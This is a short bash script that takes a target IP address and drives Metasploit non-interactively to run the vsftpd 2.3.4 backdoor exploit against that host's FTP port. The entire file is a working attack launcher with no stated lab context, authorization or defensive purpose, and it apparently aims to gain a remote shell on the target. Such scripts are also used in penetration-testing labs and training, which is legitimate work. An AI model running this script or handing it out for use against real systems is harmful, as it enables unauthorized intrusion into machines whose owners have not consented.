#!/bin/bash

# Check if IP address was provided
if [ -z "$1" ]; then
  echo "Usage: $0 <target-ip>"
  exit 1
fi

# Launch Metasploit and run the vsftpd exploit
msfconsole -q -x "
use exploit/unix/ftp/vsftpd_234_backdoor;
set RHOSTS $1;
set RPORT 21;
run;
exit"

